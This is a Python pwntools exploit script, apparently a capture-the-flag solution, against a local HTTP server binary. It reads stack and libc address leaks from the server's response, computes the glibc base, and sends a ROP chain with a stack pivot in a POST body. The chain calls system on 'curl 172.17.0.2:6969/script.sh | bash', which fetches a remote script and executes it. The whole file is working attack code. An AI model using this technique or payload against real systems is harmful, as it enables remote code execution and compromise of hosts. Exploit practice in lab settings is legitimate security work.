from pwn import *
import os
import re
context.terminal = ['tmux', 'splitw', '-h', '-F', '#{pane_pid}', '-P']


elf = ELF("./vuln")
glibc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")

# Fetch leaks from server
r = remote("localhost", 8080)
r.send(b"GET / HTTP/1.1\r\nHost: localhost\r\n\r\n")
resp = r.recvrepeat(timeout=2).decode()
r.close()

stack_leak = int(re.search(r'Stack Leak.*?: (0x[0-9a-f]+)', resp).group(1), 16)
puts = int(re.search(r'Maybe This Helps\.\.\. (0x[0-9a-f]+)', resp).group(1), 16)

log.info(f"Stack leak: {hex(stack_leak)}")
log.info(f"Puts: {hex(puts)}")

glibc.address = puts - 0x5fbe0
log.info(f"glibc: {hex(glibc.address)}")



'''
#################
##   GADGETS   ##
#################

#################
'''

pop_rdi=glibc.address+0xe778b

log.info(f"pop_rdi: {hex(pop_rdi)}")

pop_rbp=0x00000000004013dd # : pop rbp ; ret
ret=0x0040101a
leave=0x0000000000401547
'''
#################
'''

'''
#################
##   PAYLOAD   ##
#################
'''

exploit=p64(0xdeadbeef) + p64(pop_rdi)+ p64(stack_leak+0x28) + p64(ret) + p64(glibc.address+0x30750)
exploit+=b"curl 172.17.0.2:6969/script.sh | bash\x00"
#system

padding=b'a'*(104-len(exploit))

payload=exploit+padding+p64(pop_rbp) + p64(stack_leak) + p64(leave)
#                                               stack jumps to pop_rdi   

r=remote("localhost",8080)

req = (
    b"POST /submit HTTP/1.1\r\n"
    b"Host: localhost\r\n"
    b"Content-Type: application/octet-stream\r\n"
    b"Content-Length: " + str(len(payload)).encode() + b"\r\n"
    b"Connection: close\r\n"
    b"\r\n" +
    payload
)

r.send(req)

# read response (use recvrepeat to collect everything until timeout)
resp = r.recvrepeat(timeout=5)
print(resp.decode())
r.close()

